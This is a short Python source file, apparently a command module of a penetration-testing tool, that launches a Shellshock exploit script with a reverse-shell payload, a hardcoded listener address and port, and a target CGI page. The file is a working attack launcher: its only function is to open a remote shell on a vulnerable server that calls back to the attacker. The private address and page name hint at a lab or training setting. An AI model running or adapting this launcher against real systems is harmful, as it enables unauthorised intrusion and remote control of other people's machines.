from ..commands import Command 
from ..util.config import DEFAULT_IP
import subprocess
import shlex

class Shellshock(Command):
    """
    Spawn shell via Shellshock exploit.
    """
    
    def do_command(self, lines: str):
        cmd_string = f"python3 cybersploit_client/shellshock_exploit.py payload=reverse lhost=192.168.75.128 lport=8080 rhost={DEFAULT_IP} pages=/cgi-bin/shockme.cgi"
        args = shlex.split(cmd_string)
        subprocess.run(args) 
 

command = Shellshock 